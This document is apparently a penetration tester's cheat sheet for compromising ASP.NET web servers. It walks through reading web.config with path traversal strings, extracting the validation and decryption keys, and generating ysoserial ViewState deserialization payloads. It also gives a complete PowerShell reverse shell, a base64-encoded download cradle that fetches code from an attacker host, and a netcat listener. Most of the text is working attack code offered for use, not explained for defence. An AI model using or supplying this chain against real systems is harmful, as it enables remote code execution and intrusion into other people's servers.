# ASP.NET 
Dotnet is used in the windows compatible website server. formate like  ".aspx" 
# steps
1. Find the web.config file in website
2. Grap the info like Key and Algo used
3. Generate a ysoserial payload
4. Create a web cradle  and run it
5. Back connection to us

# Find the web.config file in websites
```language
=../../web.config
=..././web.config    # some time this dots are skiped
```
# Read the web.config file
```langauge
# We Need this Info:-
1. --validationalg=""
2. --validationkey=""
3. --decryptionalg=""
4. --decryptionkey=""
```
# Generate a Ysoserial Payload
Here is the Payload Example:-
```language
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/Home/Download" --apppath="/"  --decryptionalg="AES"  --decryptionkey="xyz" --validationkey="xyz" --validationalg="HMACSHA256" -c "whoami"
```
# Create a Rev.ps1 file
Change the ip address
```language
$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
# Create a cradle
```language
nano cradle
cradle content:-  IEX(New-Object Net.WebClient).downloadString("http://attacker_ip:8000")

cat cradle | iconv -t utf-16le | base64 -w0; echo
```
# Generate a Reverse Shell
```language
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/Home/Download" --apppath="/"  --decryptionalg="AES"  --decryptionkey="xyz" --validationkey="xyz" --validationalg="HMACSHA256" -c "powershell -enc <encoded code here>"
```
# Start a listner
```language
rlwrap nc -lvnp 9001
```
# Injection the payload 
```language
Capture the Request paste the payload in the   " viewstate " and Execute it .
```
